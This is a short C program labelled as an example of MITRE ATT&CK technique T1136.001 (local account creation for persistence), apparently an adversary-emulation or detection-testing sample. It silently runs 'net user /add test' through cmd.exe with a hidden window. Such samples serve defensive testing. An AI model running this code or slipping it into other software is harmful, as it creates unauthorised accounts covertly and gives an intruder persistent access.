// Link      = https://attack.mitre.org/techniques/T1136/001/
// Technique = Create Account: Local Account
// ID        = T1136.001
// Tactics   = Persistence,

#include <windows.h>


int main() {
    ShellExecuteA(
        NULL,                 
        "open",              
        "cmd.exe",            
        "/c net user /add test",                   
        NULL,                 
        SW_HIDE               
    );

    return 0;
}

